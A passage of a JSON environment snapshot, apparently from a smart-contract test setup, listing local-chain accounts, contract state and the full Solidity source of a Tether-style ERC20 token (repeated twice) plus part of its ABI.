"0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 93998306520000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "paused": false,\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1"\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "SafeMath",\n      "address": "0x9b1f7F645351AF3631a656421eD2e40f2802E6c0",\n      "abi": [],\n      "functions": [],\n      "events": [],\n      "accounts_balances": {\n        "0x9b1f7F645351AF3631a656421eD2e40f2802E6c0": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99842250980000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 93998306520000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "TetherToken",\n      "address": "0x67B5656d60a809915323Bf2C40A8bEF15A152e3e",\n      "abi": [\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "name",\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_upgradedAddress",\n              "type": "address"\n            }\n          ],\n          "name": "deprecate",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_spender",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "approve",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "deprecated",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_evilUser",\n              "type": "address"\n            }\n          ],\n          "name": "addBlackList",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "totalSupply",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_from",\n              "type": "address"\n            },\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "transferFrom",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "upgradedAddress",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "balances",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "decimals",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "maximumFee",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "_totalSupply",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "unpause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "_maker",\n              "type": "address"\n            }\n          ],\n          "name": "getBlackListStatus",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            },\n     